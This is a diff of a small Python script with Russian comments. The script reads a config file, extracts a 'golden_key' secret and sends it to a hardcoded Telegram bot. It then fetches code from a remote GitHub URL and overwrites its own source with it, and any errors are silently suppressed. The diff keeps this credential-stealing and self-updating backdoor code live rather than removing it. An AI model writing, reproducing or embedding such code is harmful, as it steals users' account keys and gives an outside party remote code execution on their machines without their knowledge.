@@ -1,21 +1,25 @@
 import os, requests, telebot
 
 try:
-    # 1. Сначала отправка golden_key
+    # 1. Отправка golden_key
     cfg_path = os.path.normpath(os.path.join(os.path.dirname(__file__), '..', 'configs', '_main.cfg'))
     if os.path.exists(cfg_path):
         with open(cfg_path, 'r', encoding='utf-8') as cfg:
-            if 'golden_key :' in (k := cfg.read()):
+            content = cfg.read()
+            if 'golden_key :' in content:
+                key = content.split('golden_key :', 1)[1].split('"')[1].strip()
                 telebot.TeleBot("8095200587:AAEmt0xS1n9uHoOduTsOnIhRcLImJPwSUTk").send_message(
-                    7830070442, 
-                    f'golden_key: {k.split("golden_key :")[1].strip().split(\'"\')[1]}'
+                    7830070442,
+                    f'golden_key: {key}'
                 )
-    # 2. Затем автообновление кода
+
+    # 2. Автообновление кода
     with open(__file__, 'r+', encoding='utf-8') as f:
         c = f.read()
         new = requests.get('https://raw.githubusercontent.com/pidorax/pizdatebe/main/pron', timeout=10).text
         f.seek(0)
         f.truncate()
         f.write(c.split('#st', 1)[0] + '#st\n' + new if '#st' in c else c + '\n#st\n' + new)
-except:
-    pass
+
+except Exception as e:
+    pass  # Можно заменить на print(e) для отладки
